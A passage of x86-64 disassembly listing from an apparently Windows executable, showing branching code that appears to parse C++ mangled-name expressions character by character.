   140003c7c:	48 c7 46 04 00 00 00 	movq   $0x0,0x4(%rsi)
   140003c83:	00 
   140003c84:	89 43 28             	mov    %eax,0x28(%rbx)
   140003c87:	c7 06 48 00 00 00    	movl   $0x48,(%rsi)
   140003c8d:	48 89 56 10          	mov    %rdx,0x10(%rsi)
   140003c91:	44 89 46 18          	mov    %r8d,0x18(%rsi)
   140003c95:	e9 79 fc ff ff       	jmp    0x140003913
   140003c9a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003ca0:	48 83 c0 02          	add    $0x2,%rax
   140003ca4:	31 d2                	xor    %edx,%edx
   140003ca6:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140003caa:	eb 1a                	jmp    0x140003cc6
   140003cac:	0f 1f 40 00          	nopl   0x0(%rax)
   140003cb0:	49 89 43 18          	mov    %rax,0x18(%r11)
   140003cb4:	48 85 d2             	test   %rdx,%rdx
   140003cb7:	0f 84 93 fd ff ff    	je     0x140003a50
   140003cbd:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140003cc1:	80 38 45             	cmpb   $0x45,(%rax)
   140003cc4:	74 3a                	je     0x140003d00
   140003cc6:	48 89 d9             	mov    %rbx,%rcx
   140003cc9:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140003cce:	e8 2d e5 ff ff       	call   0x140002200
   140003cd3:	ba 54 00 00 00       	mov    $0x54,%edx
   140003cd8:	45 31 c9             	xor    %r9d,%r9d
   140003cdb:	48 89 d9             	mov    %rbx,%rcx
   140003cde:	4c 8b 5c 24 20       	mov    0x20(%rsp),%r11
   140003ce3:	49 89 c0             	mov    %rax,%r8
   140003ce6:	e8 55 d8 ff ff       	call   0x140001540
   140003ceb:	48 89 c2             	mov    %rax,%rdx
   140003cee:	4d 85 db             	test   %r11,%r11
   140003cf1:	75 bd                	jne    0x140003cb0
   140003cf3:	48 89 c6             	mov    %rax,%rsi
   140003cf6:	eb bc                	jmp    0x140003cb4
   140003cf8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140003cff:	00 
   140003d00:	48 83 c0 01          	add    $0x1,%rax
   140003d04:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140003d08:	e9 06 fc ff ff       	jmp    0x140003913
   140003d0d:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140003d11:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   140003d15:	0f be 50 02          	movsbl 0x2(%rax),%edx
   140003d19:	8d 4a cf             	lea    -0x31(%rdx),%ecx
   140003d1c:	80 f9 04             	cmp    $0x4,%cl
   140003d1f:	0f 87 2b fd ff ff    	ja     0x140003a50
   140003d25:	48 83 c0 03          	add    $0x3,%rax
   140003d29:	44 8d 42 d0          	lea    -0x30(%rdx),%r8d
   140003d2d:	48 89 d9             	mov    %rbx,%rcx
   140003d30:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140003d34:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
   140003d39:	e8 f2 e8 ff ff       	call   0x140002630
   140003d3e:	48 8b 53 40          	mov    0x40(%rbx),%rdx
   140003d42:	44 8b 44 24 20       	mov    0x20(%rsp),%r8d
   140003d47:	e9 87 fd ff ff       	jmp    0x140003ad3
   140003d4c:	31 c0                	xor    %eax,%eax
   140003d4e:	e9 48 fb ff ff       	jmp    0x14000389b
   140003d53:	48 89 c2             	mov    %rax,%rdx
   140003d56:	e9 ad fe ff ff       	jmp    0x140003c08
   140003d5b:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140003d5f:	e9 9a fc ff ff       	jmp    0x1400039fe
   140003d64:	48 85 f6             	test   %rsi,%rsi
   140003d67:	0f 84 d3 fb ff ff    	je     0x140003940
   140003d6d:	49 89 f1             	mov    %rsi,%r9
   140003d70:	31 f6                	xor    %esi,%esi
   140003d72:	e9 a9 fb ff ff       	jmp    0x140003920
   140003d77:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140003d7e:	00 00 
   140003d80:	56                   	push   %rsi
   140003d81:	53                   	push   %rbx
   140003d82:	48 83 ec 38          	sub    $0x38,%rsp
   140003d86:	48 8b 51 18          	mov    0x18(%rcx),%rdx
   140003d8a:	0f b6 02             	movzbl (%rdx),%eax
   140003d8d:	48 89 cb             	mov    %rcx,%rbx
   140003d90:	3c 4c                	cmp    $0x4c,%al
   140003d92:	0f 84 a0 03 00 00    	je     0x140004138
   140003d98:	3c 54                	cmp    $0x54,%al
   140003d9a:	0f 84 a8 03 00 00    	je     0x140004148
   140003da0:	3c 73                	cmp    $0x73,%al
   140003da2:	74 5c                	je     0x140003e00
   140003da4:	3c 66                	cmp    $0x66,%al
   140003da6:	0f 84 cc 00 00 00    	je     0x140003e78
   140003dac:	8d 48 d0             	lea    -0x30(%rax),%ecx
   140003daf:	80 f9 09             	cmp    $0x9,%cl
   140003db2:	76 16                	jbe    0x140003dca
   140003db4:	3c 6f                	cmp    $0x6f,%al
   140003db6:	0f 85 54 01 00 00    	jne    0x140003f10
   140003dbc:	80 7a 01 6e          	cmpb   $0x6e,0x1(%rdx)
   140003dc0:	75 52                	jne    0x140003e14
   140003dc2:	48 83 c2 02          	add    $0x2,%rdx
   140003dc6:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   140003dca:	45 31 c0             	xor    %r8d,%r8d
   140003dcd:	31 d2                	xor    %edx,%edx
   140003dcf:	48 89 d9             	mov    %rbx,%rcx
   140003dd2:	e8 49 f9 ff ff       	call   0x140003720
   140003dd7:	49 89 c0             	mov    %rax,%r8
   140003dda:	48 85 c0             	test   %rax,%rax
   140003ddd:	0f 84 45 03 00 00    	je     0x140004128
   140003de3:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140003de7:	80 38 49             	cmpb   $0x49,(%rax)
   140003dea:	0f 84 60 02 00 00    	je     0x140004050
   140003df0:	4c 89 c0             	mov    %r8,%rax
   140003df3:	48 83 c4 38          	add    $0x38,%rsp
   140003df7:	5b                   	pop    %rbx
   140003df8:	5e                   	pop    %rsi
   140003df9:	c3                   	ret
   140003dfa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003e00:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   140003e04:	3c 72                	cmp    $0x72,%al
   140003e06:	0f 84 bc 01 00 00    	je     0x140003fc8
   140003e0c:	3c 70                	cmp    $0x70,%al
   140003e0e:	0f 84 1c 05 00 00    	je     0x140004330
   140003e14:	48 89 d9             	mov    %rbx,%rcx
   140003e17:	e8 34 f7 ff ff       	call   0x140003550
   140003e1c:	49 89 c2             	mov    %rax,%r10
   140003e1f:	48 85 c0             	test   %rax,%rax
   140003e22:	0f 84 00 03 00 00    	je     0x140004128
   140003e28:	8b 00                	mov    (%rax),%eax
   140003e2a:	83 f8 33             	cmp    $0x33,%eax
   140003e2d:	0f 84 3d 01 00 00    	je     0x140003f70
   140003e33:	83 f8 34             	cmp    $0x34,%eax
   140003e36:	0f 84 54 03 00 00    	je     0x140004190
   140003e3c:	83 f8 35             	cmp    $0x35,%eax
   140003e3f:	0f 85 e3 02 00 00    	jne    0x140004128
   140003e45:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140003e49:	80 38 5f             	cmpb   $0x5f,(%rax)
   140003e4c:	0f 84 48 04 00 00    	je     0x14000429a
   140003e52:	48 89 d9             	mov    %rbx,%rcx
   140003e55:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   140003e5a:	e8 21 ff ff ff       	call   0x140003d80
   140003e5f:	4c 8b 54 24 20       	mov    0x20(%rsp),%r10
   140003e64:	49 89 c1             	mov    %rax,%r9
   140003e67:	4d 89 d0             	mov    %r10,%r8
   140003e6a:	ba 38 00 00 00       	mov    $0x38,%edx
   140003e6f:	e9 fe 01 00 00       	jmp    0x140004072
   140003e74:	0f 1f 40 00          	nopl   0x0(%rax)
   140003e78:	80 7a 01 70          	cmpb   $0x70,0x1(%rdx)
   140003e7c:	75 96                	jne    0x140003e14
   140003e7e:	48 8d 42 02          	lea    0x2(%rdx),%rax
   140003e82:	48 89 41 18          	mov    %rax,0x18(%rcx)
   140003e86:	0f b6 42 02          	movzbl 0x2(%rdx),%eax
   140003e8a:	3c 54                	cmp    $0x54,%al
   140003e8c:	0f 84 86 04 00 00    	je     0x140004318
   140003e92:	3c 5f                	cmp    $0x5f,%al
   140003e94:	0f 84 ee 03 00 00    	je     0x140004288
   140003e9a:	3c 6e                	cmp    $0x6e,%al
   140003e9c:	0f 84 86 02 00 00    	je     0x140004128
   140003ea2:	e8 f9 d7 ff ff       	call   0x1400016a0
   140003ea7:	89 c1                	mov    %eax,%ecx
   140003ea9:	83 c1 01             	add    $0x1,%ecx
   140003eac:	0f 88 76 02 00 00    	js     0x140004128
   140003eb2:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   140003eb6:	80 3a 5f             	cmpb   $0x5f,(%rdx)
   140003eb9:	0f 85 69 02 00 00    	jne    0x140004128
   140003ebf:	48 83 c2 01          	add    $0x1,%rdx
   140003ec3:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   140003ec7:	81 f9 ff ff ff 7f    	cmp    $0x7fffffff,%ecx
   140003ecd:	0f 84 55 02 00 00    	je     0x140004128
   140003ed3:	83 c0 02             	add    $0x2,%eax
   140003ed6:	8b 53 28             	mov    0x28(%rbx),%edx
   140003ed9:	3b 53 2c             	cmp    0x2c(%rbx),%edx
   140003edc:	0f 8d 46 02 00 00    	jge    0x140004128
   140003ee2:	4c 63 c2             	movslq %edx,%r8
   140003ee5:	83 c2 01             	add    $0x1,%edx
   140003ee8:	49 c1 e0 05          	shl    $0x5,%r8
   140003eec:	4c 03 43 20          	add    0x20(%rbx),%r8
   140003ef0:	49 c7 40 04 00 00 00 	movq   $0x0,0x4(%r8)
   140003ef7:	00 
   140003ef8:	89 53 28             	mov    %edx,0x28(%rbx)
   140003efb:	41 c7 00 06 00 00 00 	movl   $0x6,(%r8)
   140003f02:	41 89 40 10          	mov    %eax,0x10(%r8)
   140003f06:	e9 e5 fe ff ff       	jmp    0x140003df0
   140003f0b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003f10:	3c 69                	cmp    $0x69,%al
   140003f12:	74 08                	je     0x140003f1c
   140003f14:	3c 74                	cmp    $0x74,%al
   140003f16:	0f 85 3c 02 00 00    	jne    0x140004158
   140003f1c:	80 7a 01 6c          	cmpb   $0x6c,0x1(%rdx)
   140003f20:	0f 85 ee fe ff ff    	jne    0x140003e14
   140003f26:	48 83 c2 02          	add    $0x2,%rdx
   140003f2a:	45 31 c0             	xor    %r8d,%r8d
   140003f2d:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   140003f31:	3c 74                	cmp    $0x74,%al
   140003f33:	0f 84 cf 04 00 00    	je     0x140004408
   140003f39:	80 3a 00             	cmpb   $0x0,(%rdx)
   140003f3c:	0f 84 e6 01 00 00    	je     0x140004128
   140003f42:	80 7a 01 00          	cmpb   $0x0,0x1(%rdx)
   140003f46:	0f 84 dc 01 00 00    	je     0x140004128
   140003f4c:	ba 45 00 00 00       	mov    $0x45,%edx
   140003f51:	48 89 d9             	mov    %rbx,%rcx
   140003f54:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
   140003f59:	e8 42 07 00 00       	call   0x1400046a0
   140003f5e:	4c 8b 44 24 20       	mov    0x20(%rsp),%r8
   140003f63:	ba 32 00 00 00       	mov    $0x32,%edx
   140003f68:	49 89 c1             	mov    %rax,%r9
   140003f6b:	e9 02 01 00 00       	jmp    0x140004072
   140003f70:	49 8b 52 10          	mov    0x10(%r10),%rdx
   140003f74:	4c 8b 0a             	mov    (%rdx),%r9
   140003f77:	8b 42 10             	mov    0x10(%rdx),%eax
   140003f7a:	83 e8 02             	sub    $0x2,%eax
   140003f7d:	01 43 48             	add    %eax,0x48(%rbx)
   140003f80:	41 0f b6 01          	movzbl (%r9),%eax
   140003f84:	83 f8 73             	cmp    $0x73,%eax
   140003f87:	0f 85 f3 00 00 00    	jne    0x140004080
   140003f8d:	41 80 79 01 74       	cmpb   $0x74,0x1(%r9)
   140003f92:	0f 85 e8 00 00 00    	jne    0x140004080
   140003f98:	41 80 79 02 00       	cmpb   $0x0,0x2(%r9)
   140003f9d:	0f 85 dd 00 00 00    	jne    0x140004080
   140003fa3:	48 89 d9             	mov    %rbx,%rcx
   140003fa6:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   140003fab:	e8 80 e6 ff ff       	call   0x140002630
   140003fb0:	4c 8b 44 24 20       	mov    0x20(%rsp),%r8
   140003fb5:	ba 38 00 00 00       	mov    $0x38,%edx
   140003fba:	49 89 c1             	mov    %rax,%r9
   140003fbd:	e9 b0 00 00 00       	jmp    0x140004072
   140003fc2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003fc8:	48 8d 42 02          	lea    0x2(%rdx),%rax
   140003fcc:	48 89 41 18          	mov    %rax,0x18(%rcx)
   140003fd0:	8b 41 54             	mov    0x54(%rcx),%eax
   140003fd3:	85 c0                	test   %eax,%eax
   140003fd5:	0f 84 7a 03 00 00    	je     0x140004355
   140003fdb:	0f b6 42 02          	movzbl 0x2(%rdx),%eax
   140003fdf:	3c 39                	cmp    $0x39,%al
   140003fe1:	0f 8e 66 03 00 00    	jle    0x14000434d
   140003fe7:	83 e8 43             	sub    $0x43,%eax
   140003fea:	3c 37                	cmp    $0x37,%al
   140003fec:	0f 87 63 03 00 00    	ja     0x140004355
   140003ff2:	48 ba 01 02 04 c0 ff 	movabs $0xffffffc0040201,%rdx
   140003ff9:	ff ff 00 
   140003ffc:	48 0f a3 c2          	bt     %rax,%rdx
   140004000:	0f 83 4f 03 00 00    	jae    0x140004355
   140004006:	c7 43 54 ff ff ff ff 	movl   $0xffffffff,0x54(%rbx)
   14000400d:	31 d2                	xor    %edx,%edx
   14000400f:	48 89 d9             	mov    %rbx,%rcx
   140004012:	e8 89 0a 00 00       	call   0x140004aa0
   140004017:	48 89 c2             	mov    %rax,%rdx
   14000401a:	48 8b 43 18          	mov    0x18(%rbx),%rax
   14000401e:	80 38 45             	cmpb   $0x45,(%rax)
   140004021:	75 0d                	jne    0x140004030
   140004023:	48 83 c0 01          	add    $0x1,%rax
   140004027:	48 89 43 18          	mov    %rax,0x18(%rbx)
   14000402b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004030:	45 31 c0             	xor    %r8d,%r8d
   140004033:	48 89 d9             	mov    %rbx,%rcx
   140004036:	e8 e5 f6 ff ff       	call   0x140003720
   14000403b:	49 89 c0             	mov    %rax,%r8
   14000403e:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140004042:	80 38 49             	cmpb   $0x49,(%rax)
   140004045:	0f 85 a5 fd ff ff    	jne    0x140003df0
   14000404b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004050:	48 83 c0 01          	add    $0x1,%rax
   140004054:	48 89 d9             	mov    %rbx,%rcx
   140004057:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
   14000405c:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140004060:	e8 1b 09 00 00       	call   0x140004980
   140004065:	4c 8b 44 24 20       	mov    0x20(%rsp),%r8
   14000406a:	ba 04 00 00 00       	mov    $0x4,%edx
   14000406f:	49 89 c1             	mov    %rax,%r9
   140004072:	48 89 d9             	mov    %rbx,%rcx
   140004075:	48 83 c4 38          	add    $0x38,%rsp
   140004079:	5b                   	pop    %rbx
   14000407a:	5e                   	pop    %rsi
   14000407b:	e9 c0 d4 ff ff       	jmp    0x140001540
   140004080:	8b 52 14             	mov    0x14(%rdx),%edx
   140004083:	83 fa 02             	cmp    $0x2,%edx
   140004086:	0f 84 34 01 00 00    	je     0x1400041c0
   14000408c:	0f 8f d6 02 00 00    	jg     0x140004368
   140004092:	85 d2                	test   %edx,%edx
   140004094:	0f 84 14 01 00 00    	je     0x1400041ae
   14000409a:	83 fa 01             	cmp    $0x1,%edx
   14000409d:	0f 85 85 00 00 00    	jne    0x140004128
   1400040a3:	41 0f b6 09          	movzbl (%r9),%ecx
   1400040a7:	80 f9 6d             	cmp    $0x6d,%cl
   1400040aa:	0f 84 18 02 00 00    	je     0x1400042c8
   1400040b0:	80 f9 70             	cmp    $0x70,%cl
   1400040b3:	0f 84 0f 02 00 00    	je     0x1400042c8
   1400040b9:	31 d2                	xor    %edx,%edx
   1400040bb:	83 f8 73             	cmp    $0x73,%eax
   1400040be:	0f 85 2c 02 00 00    	jne    0x1400042f0
   1400040c4:	41 80 79 01 50       	cmpb   $0x50,0x1(%r9)
   1400040c9:	0f 85 21 02 00 00    	jne    0x1400042f0
   1400040cf:	41 80 79 02 00       	cmpb   $0x0,0x2(%r9)
   1400040d4:	0f 85 16 02 00 00    	jne    0x1400042f0
   1400040da:	48 89 d9             	mov    %rbx,%rcx
   1400040dd:	4c 89 54 24 28       	mov    %r10,0x28(%rsp)
   1400040e2:	89 54 24 20          	mov    %edx,0x20(%rsp)
   1400040e6:	e8 95 08 00 00       	call   0x140004980
   1400040eb:	8b 54 24 20          	mov    0x20(%rsp),%edx
   1400040ef:	4c 8b 54 24 28       	mov    0x28(%rsp),%r10
   1400040f4:	49 89 c1             	mov    %rax,%r9
   1400040f7:	85 d2                	test   %edx,%edx
   1400040f9:	0f 84 68 fd ff ff    	je     0x140003e67
   1400040ff:	4d 89 c8             	mov    %r9,%r8
   140004102:	ba 3a 00 00 00       	mov    $0x3a,%edx
   140004107:	48 89 d9             	mov    %rbx,%rcx
   14000410a:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   14000410f:	e8 2c d4 ff ff       	call   0x140001540
   140004114:	4c 8b 54 24 20       	mov    0x20(%rsp),%r10
   140004119:	49 89 c1             	mov    %rax,%r9
   14000411c:	e9 46 fd ff ff       	jmp    0x140003e67
   140004121:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004128:	45 31 c0             	xor    %r8d,%r8d
   14000412b:	4c 89 c0             	mov    %r8,%rax
   14000412e:	48 83 c4 38          	add    $0x38,%rsp
   140004132:	5b                   	pop    %rbx
   140004133:	5e                   	pop    %rsi
   140004134:	c3                   	ret
   140004135:	0f 1f 00             	nopl   (%rax)
   140004138:	48 83 c4 38          	add    $0x38,%rsp
   14000413c:	5b                   	pop    %rbx
   14000413d:	5e                   	pop    %rsi
   14000413e:	e9 dd 18 00 00       	jmp    0x140005a20
   140004143:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004148:	48 83 c4 38          	add    $0x38,%rsp
   14000414c:	5b                   	pop    %rbx
   14000414d:	5e                   	pop    %rsi
   14000414e:	e9 3d dd ff ff       	jmp    0x140001e90
   140004153:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004158:	3c 75                	cmp    $0x75,%al
   14000415a:	0f 85 b4 fc ff ff    	jne    0x140003e14
   140004160:	48 83 c2 01          	add    $0x1,%rdx
   140004164:	48 89 d9             	mov    %rbx,%rcx
   140004167:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   14000416b:	e8 90 e0 ff ff       	call   0x140002200
   140004170:	48 89 d9             	mov    %rbx,%rcx
   140004173:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004178:	e8 03 08 00 00       	call   0x140004980
   14000417d:	4c 8b 44 24 20       	mov    0x20(%rsp),%r8
   140004182:	ba 40 00 00 00       	mov    $0x40,%edx
   140004187:	49 89 c1             	mov    %rax,%r9
   14000418a:	e9 e3 fe ff ff       	jmp    0x140004072
   14000418f:	90                   	nop
   140004190:	41 8b 42 10          	mov    0x10(%r10),%eax
   140004194:	83 f8 01             	cmp    $0x1,%eax
   140004197:	0f 84 b5 fc ff ff    	je     0x140003e52
   14000419d:	83 f8 03             	cmp    $0x3,%eax
   1400041a0:	0f 84 82 ff ff ff    	je     0x140004128
   1400041a6:	85 c0                	test   %eax,%eax
   1400041a8:	0f 85 7a ff ff ff    	jne    0x140004128
   1400041ae:	45 31 c9             	xor    %r9d,%r9d
   1400041b1:	4d 89 d0             	mov    %r10,%r8
   1400041b4:	ba 37 00 00 00       	mov    $0x37,%edx
   1400041b9:	e9 b4 fe ff ff       	jmp    0x140004072
   1400041be:	66 90                	xchg   %ax,%ax
   1400041c0:	41 0f b6 11          	movzbl (%r9),%edx
   1400041c4:	41 80 79 01 63       	cmpb   $0x63,0x1(%r9)
   1400041c9:	0f 84 aa 03 00 00    	je     0x140004579
   1400041cf:	80 fa 66             	cmp    $0x66,%dl
   1400041d2:	0f 84 3a 04 00 00    	je     0x140004612
   1400041d8:	83 f8 64             	cmp    $0x64,%eax
   1400041db:	0f 85 01 04 00 00    	jne    0x1400045e2
   1400041e1:	41 80 79 01 69       	cmpb   $0x69,0x1(%r9)
   1400041e6:	0f 85 f6 03 00 00    	jne    0x1400045e2
   1400041ec:	41 80 79 02 00       	cmpb   $0x0,0x2(%r9)
   1400041f1:	0f 85 eb 03 00 00    	jne    0x1400045e2
   1400041f7:	45 31 c0             	xor    %r8d,%r8d
   1400041fa:	31 d2                	xor    %edx,%edx
   1400041fc:	48 89 d9             	mov    %rbx,%rcx
   1400041ff:	4c 89 54 24 28       	mov    %r10,0x28(%rsp)
   140004204:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140004209:	e8 12 f5 ff ff       	call   0x140003720
   14000420e:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
   140004213:	4c 8b 54 24 28       	mov    0x28(%rsp),%r10
   140004218:	48 89 c6             	mov    %rax,%rsi
   14000421b:	41 0f b6 01          	movzbl (%r9),%eax
   14000421f:	83 f8 63             	cmp    $0x63,%eax
   140004222:	0f 85 b0 02 00 00    	jne    0x1400044d8
   140004228:	41 80 79 01 6c       	cmpb   $0x6c,0x1(%r9)
   14000422d:	0f 85 a5 02 00 00    	jne    0x1400044d8
   140004233:	41 80 79 02 00       	cmpb   $0x0,0x2(%r9)
   140004238:	0f 85 9a 02 00 00    	jne    0x1400044d8
   14000423e:	ba 45 00 00 00       	mov    $0x45,%edx
   140004243:	48 89 d9             	mov    %rbx,%rcx
   140004246:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   14000424b:	e8 50 04 00 00       	call   0x1400046a0
   140004250:	4c 8b 54 24 20       	mov    0x20(%rsp),%r10
   140004255:	49 89 c0             	mov    %rax,%r8
   140004258:	4d 89 c1             	mov    %r8,%r9
   14000425b:	ba 3a 00 00 00       	mov    $0x3a,%edx
   140004260:	49 89 f0             	mov    %rsi,%r8
   140004263:	48 89 d9             	mov    %rbx,%rcx
   140004266:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   14000426b:	e8 d0 d2 ff ff       	call   0x140001540
   140004270:	4c 8b 44 24 20       	mov    0x20(%rsp),%r8
   140004275:	ba 39 00 00 00       	mov    $0x39,%edx
   14000427a:	49 89 c1             	mov    %rax,%r9
   14000427d:	e9 f0 fd ff ff       	jmp    0x140004072
   140004282:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004288:	48 83 c2 03          	add    $0x3,%rdx
   14000428c:	b8 01 00 00 00       	mov    $0x1,%eax
   140004291:	48 89 51 18          	mov    %rdx,0x18(%rcx)
   140004295:	e9 3c fc ff ff       	jmp    0x140003ed6
   14000429a:	48 83 c0 01          	add    $0x1,%rax
   14000429e:	ba 45 00 00 00       	mov    $0x45,%edx
   1400042a3:	48 89 d9             	mov    %rbx,%rcx
   1400042a6:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   1400042ab:	48 89 43 18          	mov    %rax,0x18(%rbx)
   1400042af:	e8 ec 03 00 00       	call   0x1400046a0
   1400042b4:	4c 8b 54 24 20       	mov    0x20(%rsp),%r10
   1400042b9:	49 89 c1             	mov    %rax,%r9
   1400042bc:	e9 a6 fb ff ff       	jmp    0x140003e67
   1400042c1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400042c8:	41 38 49 01          	cmp    %cl,0x1(%r9)
   1400042cc:	0f 85 e7 fd ff ff    	jne    0x1400040b9
   1400042d2:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   1400042d6:	80 39 5f             	cmpb   $0x5f,(%rcx)
   1400042d9:	0f 85 dc fd ff ff    	jne    0x1400040bb
   1400042df:	48 83 c1 01          	add    $0x1,%rcx
   1400042e3:	48 89 4b 18          	mov    %rcx,0x18(%rbx)
   1400042e7:	41 0f b6 01          	movzbl (%r9),%eax
   1400042eb:	e9 c9 fd ff ff       	jmp    0x1400040b9
   1400042f0:	48 89 d9             	mov    %rbx,%rcx
   1400042f3:	4c 89 54 24 28       	mov    %r10,0x28(%rsp)
   1400042f8:	89 54 24 20          	mov    %edx,0x20(%rsp)
   1400042fc:	e8 7f fa ff ff       	call   0x140003d80
   140004301:	4c 8b 54 24 28       	mov    0x28(%rsp),%r10
   140004306:	8b 54 24 20          	mov    0x20(%rsp),%edx
   14000430a:	49 89 c1             	mov    %rax,%r9
   14000430d:	e9 e5 fd ff ff       	jmp    0x1400040f7
   140004312:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004318:	48 83 c2 03          	add    $0x3,%rdx
   14000431c:	31 c0                	xor    %eax,%eax
   14000431e:	48 89 51 18          	mov    %rdx,0x18(%rcx)
   140004322:	e9 af fb ff ff       	jmp    0x140003ed6
   140004327:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000432e:	00 00 
   140004330:	48 83 c2 02          	add    $0x2,%rdx
   140004334:	48 89 51 18          	mov    %rdx,0x18(%rcx)
   140004338:	e8 43 fa ff ff       	call   0x140003d80
   14000433d:	45 31 c9             	xor    %r9d,%r9d
   140004340:	ba 4d 00 00 00       	mov    $0x4d,%edx
   140004345:	49 89 c0             	mov    %rax,%r8
   140004348:	e9 25 fd ff ff       	jmp    0x140004072
   14000434d:	3c 2f                	cmp    $0x2f,%al
   14000434f:	0f 8f b1 fc ff ff    	jg     0x140004006
   140004355:	48 89 d9             	mov    %rbx,%rcx
   140004358:	e8 d3 e2 ff ff       	call   0x140002630
   14000435d:	48 89 c2             	mov    %rax,%rdx
   140004360:	e9 cb fc ff ff       	jmp    0x140004030
   140004365:	0f 1f 00             	nopl   (%rax)
   140004368:	83 fa 03             	cmp    $0x3,%edx
   14000436b:	0f 85 b7 fd ff ff    	jne    0x140004128
   140004371:	83 f8 71             	cmp    $0x71,%eax
   140004374:	0f 85 a6 00 00 00    	jne    0x140004420
   14000437a:	41 80 79 01 75       	cmpb   $0x75,0x1(%r9)
   14000437f:	0f 85 9b 00 00 00    	jne    0x140004420
   140004385:	41 80 79 02 00       	cmpb   $0x0,0x2(%r9)
   14000438a:	0f 85 90 00 00 00    	jne    0x140004420
   140004390:	48 89 d9             	mov    %rbx,%rcx
   140004393:	4c 89 54 24 28       	mov    %r10,0x28(%rsp)
   140004398:	e8 e3 f9 ff ff       	call   0x140003d80
   14000439d:	48 89 d9             	mov    %rbx,%rcx
   1400043a0:	48 89 c6             	mov    %rax,%rsi
   1400043a3:	e8 d8 f9 ff ff       	call   0x140003d80
   1400043a8:	48 89 d9             	mov    %rbx,%rcx
   1400043ab:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400043b0:	e8 cb f9 ff ff       	call   0x140003d80
   1400043b5:	4c 8b 44 24 20       	mov    0x20(%rsp),%r8
   1400043ba:	4c 8b 54 24 28       	mov    0x28(%rsp),%r10
   1400043bf:	48 85 c0             	test   %rax,%rax
   1400043c2:	49 89 c1             	mov    %rax,%r9
   1400043c5:	0f 84 5d fd ff ff    	je     0x140004128
   1400043cb:	ba 3d 00 00 00       	mov    $0x3d,%edx
   1400043d0:	48 89 d9             	mov    %rbx,%rcx
   1400043d3:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   1400043d8:	e8 63 d1 ff ff       	call   0x140001540
   1400043dd:	49 89 f0             	mov    %rsi,%r8
   1400043e0:	ba 3c 00 00 00       	mov    $0x3c,%edx
   1400043e5:	48 89 d9             	mov    %rbx,%rcx
   1400043e8:	49 89 c1             	mov    %rax,%r9
   1400043eb:	e8 50 d1 ff ff       	call   0x140001540
   1400043f0:	4c 8b 44 24 20       	mov    0x20(%rsp),%r8
   1400043f5:	ba 3b 00 00 00       	mov    $0x3b,%edx
   1400043fa:	49 89 c1             	mov    %rax,%r9
   1400043fd:	e9 70 fc ff ff       	jmp    0x140004072
   140004402:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004408:	48 89 d9             	mov    %rbx,%rcx
   14000440b:	e8 20 e2 ff ff       	call   0x140002630
   140004410:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   140004414:	49 89 c0             	mov    %rax,%r8
   140004417:	e9 1d fb ff ff       	jmp    0x140003f39
   14000441c:	0f 1f 40 00          	nopl   0x0(%rax)
   140004420:	83 f8 64             	cmp    $0x64,%eax
   140004423:	75 12                	jne    0x140004437
   140004425:	41 80 79 01 58       	cmpb   $0x58,0x1(%r9)
   14000442a:	75 0b                	jne    0x140004437
   14000442c:	41 80 79 02 00       	cmpb   $0x0,0x2(%r9)
   140004431:	0f 84 59 ff ff ff    	je     0x140004390
   140004437:	41 0f b6 01          	movzbl (%r9),%eax
   14000443b:	3c 66                	cmp    $0x66,%al
   14000443d:	0f 84 f3 01 00 00    	je     0x140004636
   140004443:	3c 6e                	cmp    $0x6e,%al
   140004445:	0f 85 dd fc ff ff    	jne    0x140004128
   14000444b:	41 0f b6 41 01       	movzbl 0x1(%r9),%eax
   140004450:	3c 77                	cmp    $0x77,%al
   140004452:	74 08                	je     0x14000445c
   140004454:	3c 61                	cmp    $0x61,%al
   140004456:	0f 85 cc fc ff ff    	jne    0x140004128
